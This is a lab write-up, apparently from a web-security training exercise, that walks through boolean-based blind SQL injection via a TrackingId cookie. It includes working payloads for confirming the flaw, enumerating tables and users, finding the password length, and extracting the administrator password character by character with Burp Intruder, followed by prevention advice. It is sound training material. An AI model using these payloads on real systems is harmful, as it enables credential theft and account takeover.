# Blind SQL Injection with Conditional Responses

## Objective

Exploit a blind SQL injection vulnerability in the `TrackingId` cookie to determine the administrator user's password and log in as the administrator account.

## Vulnerable Parameter

`TrackingId` cookie

## Step 1: Verify Blind SQL Injection

Payload:

```http
TrackingId=Nb7SjgTWZ3BYSmAe' AND '1'='1
```

Result:
- "Welcome back" message appeared.

Payload:

```http
TrackingId=Nb7SjgTWZ3BYSmAe' AND '1'='2
```

Result:
- No "Welcome back" message appeared.

Conclusion:
- The application behavior changes depending on whether a condition is true or false.
- This confirms a blind SQL injection vulnerability.

## Step 2: Confirm the Users Table Exists

Payload:

```http
TrackingId=Nb7SjgTWZ3BYSmAe' AND (SELECT 'a' FROM users LIMIT 1)='a
```

Result:
- "Welcome back" message appeared.

Conclusion:
- Confirmed that a table named `users` exists.

## Step 3: Confirm Administrator User Exists

Payload:

```http
TrackingId=Nb7SjgTWZ3BYSmAe' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

Result:
- "Welcome back" message appeared.

Conclusion:
- Confirmed that a user named `administrator` exists.

## Step 4: Determine Password Length

Payload:

```http
TrackingId=Nb7SjgTWZ3BYSmAe' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

Result:
- "Welcome back" appeared.

I repeated the test with different values:

```http
TrackingId=Nb7SjgTWZ3BYSmAe' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
```

Result:
- "Welcome back" did not appear.

Conclusion:
- The administrator password length is **20 characters**.

## Step 5: Extract Password Characters Using Burp Intruder

Sent the request to Burp Intruder.

Payload:

```http
TrackingId=Nb7SjgTWZ3BYSmAe' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§'
```

Configuration:

- Attack type: `Sniper`
- Payloads:
  - `a-z`
  - `0-9`
- Grep - Match:
  - `Welcome back`

Result:
- Started the attack.
- The payload that returned "Welcome back" revealed the first password character.

For the second character:

```http
TrackingId=Nb7SjgTWZ3BYSmAe' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§'
```

For the third character:

```http
TrackingId=Nb7SjgTWZ3BYSmAe' AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username='administrator')='§a§'
```

Repeated this process until all 20 characters were extracted.

## Step 6: Log In as Administrator

Using the recovered password, I logged in as the administrator user and solved the lab.

## Explanation

Blind SQL injection occurs when application responses do not directly display query results or error messages.

Instead of seeing the database output, the application behavior changes based on whether a condition evaluates to true or false.

By using conditional statements and observing the presence of the "Welcome back" message, it was possible to infer:

- The existence of tables
- The existence of users
- Password length
- Individual password characters

## Security Impact

An attacker could:

- Extract sensitive data without direct output
- Recover credentials
- Compromise user accounts
- Gain administrative access

## Prevention

- Use parameterized queries (prepared statements)
- Avoid building SQL queries using string concatenation
- Validate and sanitize user input
- Limit database permissions
- Perform regular security testing

## Key Concepts Learned

- Blind SQL injection
- Boolean-based SQL injection
- Conditional responses
- Password length enumeration
- Character-by-character extraction
- Burp Intruder automation
- Authentication compromise
